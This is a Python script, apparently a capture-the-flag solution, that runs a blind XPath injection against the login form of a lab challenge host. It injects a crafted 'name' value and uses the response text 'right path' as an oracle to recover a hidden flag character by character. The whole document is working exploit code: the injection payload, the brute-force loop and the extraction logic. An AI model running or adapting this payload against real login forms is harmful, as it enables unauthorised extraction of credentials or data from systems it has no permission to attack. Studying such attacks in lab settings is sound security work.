import sys, requests, urllib3, string, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
SENT = "right path"


def check(prefix):
    inj = "' or //*[contains(.,\"%s\")] or 'x'='" % prefix
    try:
        r = requests.post(BASE, data={"name": inj, "pass": "asdf"}, timeout=20)
    except Exception:
        return False
    return SENT in r.text


for cand in ("academy{", "academy", "{"):
    print("test %r -> %s" % (cand, check(cand)))
flag = None
for start in ("academy{", "academy", ""):
    if check(start):
        flag = start
        print("depart:", repr(flag))
        break
if flag is None:
    sys.exit(1)
options = string.ascii_lowercase + string.digits + "_}" + string.ascii_uppercase + "-!@ .#," 
while not flag.endswith("}") and len(flag) < 90:
    found = False
    for ch in options:
        if check(flag + ch):
            flag += ch
            print("  %r" % flag, flush=True)
            found = True
            break
    if not found:
        print("bloque apres %r" % flag)
        break
print("\nFLAG:", flag)
